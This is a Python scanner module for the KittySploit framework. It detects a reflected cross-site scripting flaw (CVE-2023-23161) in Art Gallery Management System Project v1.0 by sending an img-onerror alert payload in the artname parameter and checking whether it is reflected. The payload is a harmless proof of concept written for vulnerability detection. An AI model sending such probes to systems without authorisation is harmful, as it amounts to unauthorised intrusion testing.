#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A reflected cross-site scripting (XSS) vulnerability in Art Gallery Management System Project v1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Art Gallery Management System Project v1.0 - Cross-Site Scripting Detection',
        'description': 'A reflected cross-site scripting (XSS) vulnerability in Art Gallery Management System Project v1.0 allows attackers to execute arbitrary web scripts or HTML via a crafted payload injected into the artname parameter under ART TYPE option in the navigation bar.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2023',
            'packetstorm',
            'art',
            'gallery',
            'xss',
            'art_gallery_management_system_project',
            'phpgurukul',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/51214',
            'https://github.com/rahulpatwari/CVE/blob/main/CVE-2023-23161/CVE-2023-23161.txt',
            'https://packetstormsecurity.com/files/171642/Art-Gallery-Management-System-Project-1.0-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-23161',
            'http://packetstormsecurity.com/files/171642/Art-Gallery-Management-System-Project-1.0-Cross-Site-Scripting.html',
        ],
        'cve': 'CVE-2023-23161',
    }

    def run(self):
        r = self.http_request(method="GET", path='/product.php?cid=1&&artname=%3Cimg%20src=1%20onerror=alert(document.domain)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('center"><img src=1 onerror=alert(document.domain)>', 'Art Type',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Art Gallery Management System Project v1.0 - Cross-Site Scripting detected",
                path='/product.php?cid=1&&artname=%3Cimg%20src=1%20onerror=alert(document.domain)%3E',
            )
            return True
        return False

